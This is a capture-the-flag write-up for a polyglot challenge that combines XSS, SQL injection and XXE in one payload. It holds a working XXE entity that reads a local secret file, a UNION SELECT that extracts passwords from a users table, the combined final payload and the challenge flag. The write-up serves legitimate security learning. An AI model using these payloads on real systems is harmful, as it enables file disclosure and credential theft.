# A Payload To Rule Them All

This is a polyglot challenge. Unfortunately I don't have the challenge statement any more, but the only hint was to write an XSS/SQLi/XXE in a single payload. 

We know how each payload is parsed according to the [source](source)

XXE:     
``var doc = libxml.parseXml(payload, { noent: true ,nonet: true })``

XSS:     
``await page.goto(`data:text/html,<script>${payload}</script>`)``

SQLI:     
``const sqli = await query(`SELECT * from posts where id='${payload}'`)``

So the first thing I did was to run it locally on node, since the source was given.

Due to the logic at the end of the code:     
<details>
  <summary>Code Logic</summary>   
  
```
  Promise.all([xss,sqli]).then( function( values ){
                if ( values[0] && values[1] && xxe ) {
                        console.log("parabens hackudo")
                } else {
                        console.log("hack harder")
                }

                process.exit(0)
        })
	
}
```
   </details>

I found out that it is possible to declare `xss=true` and it will be rendered as having passed the XSS payload tester.

So I worked on the XXE, by using a typical payload to read the `xxe_secret` file shown in the source:     
`<?xml version="1.0" ?><!DOCTYPE abc [<!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret">`

This is a typical XXE payload I grabbed off the net and replaced with my own file path. And this likewise passed the XXE payload tester.

The hard part is the SQLi, which I got stuck for a long while due to a mistaken notion and *spaces*. So anyway I got the idea from a friend to just bruteforce it and came up with the following payload, which passed the SQLi payload tester:     

```
UNION SELECT password, 1, 2 FROM users; -- 
```     
*(The space at the end is important!!)*

We then combine the payloads into one like this, while bypassing the `sanitizeHTML` function using a random tag instead of script tag, and arranging the payload according to how it gets parsed:     
<details>
  <summary>Final Payload</summary> 
  
`<?xml version="1.0" ?><!DOCTYPE abc [<!ENTITY xxe SYSTEM "file:///home/gnx/script/xxe_secret"><!ENTITY lolwat SYSTEM "' UNION SELECT password, 1, 2 FROM users; -- '>">]><abc><b>";xss=true;//</b><foo>&xxe;</foo></abc>`
   </details>

And got the flag!
<details>
  <summary>FLAG</summary>   
  
  `CTF-BR{p4yl04d_p0lygl0ts_4r3_m0r3_fun_th4n_f1l3typ3s}`
   </details>
